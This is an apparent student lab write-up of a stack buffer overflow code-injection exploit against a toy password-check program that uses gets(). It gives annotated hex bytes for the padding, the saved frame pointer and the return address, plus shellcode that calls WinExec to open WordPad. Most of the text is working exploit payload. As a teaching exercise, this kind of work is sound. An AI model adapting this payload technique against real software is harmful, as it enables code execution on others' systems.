Code Injection project by Max Parisi, finished 12/19/18

I am using GNU GCC 6.3.0 through 32-bit MinGW on Windows 10. By exploiting the flawed use of the gets() function
in the IsPasswordOkay program, which I renamed "pass.c", I was able to create a code injection exploit that writes 
code onto the stack that executes the "\Windows\write.exe" program on my machine, opening WordPad. To help ensure that this 
exploit would work, I switched of the "Execute Disable" feature in my UEFI firmware settings. This makes the stack executable.
I wrote my malicious argument in a hex editor; the ASCII equivalent is included and annotated below:


-- "don'tcare" followed by 11 null bytes. By compiling and inspecting the pass.s file, 
I saw that 20 bytes were allocated on the stack for the password array instead of the requested 12.
It doesn't matter what goes into the stack here, as long as there are no newlines, which trigger gets() to end. --

64 6F 6E 27 
74 63 61 72 
65 00 00 00 
00 00 00 00 
00 00 00 00 


-- This is the saved %ebp from the main function. I found it by checking the registers during a breakpoint
in the middle of the main function, because %ebp's value at this time represents what will be put on the stack
during isPasswordOK's prologue. Just putting 0s here was causing problems, so I copied down the correct %ebp value.--
 
38 FF 61 00 

-- This is the return address to my injected code, which I know will be stored 24 bytes after
isPasswordOK's %ebp, 0x0061ff08 --
20 FF 61 00 

-- These 16 bytes represent the "\Windows\write" string, the first parameter to the WinExec function in kernel32.dll,
followed by two null bytes for padding. --
5C 57 69 6E 
64 6F 77 73 
5C 77 72 69 
74 65 00 00 

-- This is the beginning of the exploit code, which will begin at address 0x0061ff20. The exploit simply prepares the two
parameters for WinExec, which are an int defining how to open the program window (I use 3 to maximize the window), and the
pointer to the string "\Windows\write" defined previously. The parameters must be pushed in reverse order of the documentation,
due to x86's stack conventions, so after I push 3 onto the stack, %esp is no longer pointing to the beginning of my string. Therefore,
my lea instruction computes 4(%esp), which is the address of the string pointer. --

31 DB               xor     %ebx, %ebx
BB 03 00 00 00      movl    $0x3, %ebx              uCmdShow = 3
53                  push    %ebx
8D 5C 24 04         leal    0x4(%esp), %ebx         lpCmdLine = "\Windows\write"
53                  push    %ebx
BB 80 39 E3 76      movl    $0x76e33980, %ebx       put address of WinExec (found via GetProcAddress) into %ebx (May need to update this if exploit stops working due to update)
FF D3               call    *%ebx                   call WinExec
C9                  leave
C3                  ret

-- Finally, I put a newline character to trigger the end of the gets() routine. The isPasswordOK
function can now finish, and upon returning, the pointer to my exploit code will be written into %eip

0A

-End of exploit code --